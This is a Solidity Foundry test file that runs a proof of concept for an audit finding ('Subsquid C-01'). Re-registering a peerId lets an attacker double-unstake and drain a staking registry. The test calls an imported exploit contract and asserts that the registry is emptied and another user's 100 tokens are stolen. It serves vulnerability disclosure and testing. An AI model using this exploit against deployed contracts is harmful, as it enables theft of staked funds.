// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58244-c-01-gateway-creator-can-steal-all-tokens-from-the-gatewayre.sol";

/* Subsquid C-01 — re-register peerId double-unstakes / drains registry (Pashov) */
contract PoC_58244 is Test {
    function test_stealStakes() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e.registry())), 0, "registry drained");
        assertEq(e.token().balanceOf(address(e.alice())), 2 * e.AMOUNT(), "alice holds 200");
        assertEq(e.stolen(), e.AMOUNT(), "stole Bob's 100");
    }
}
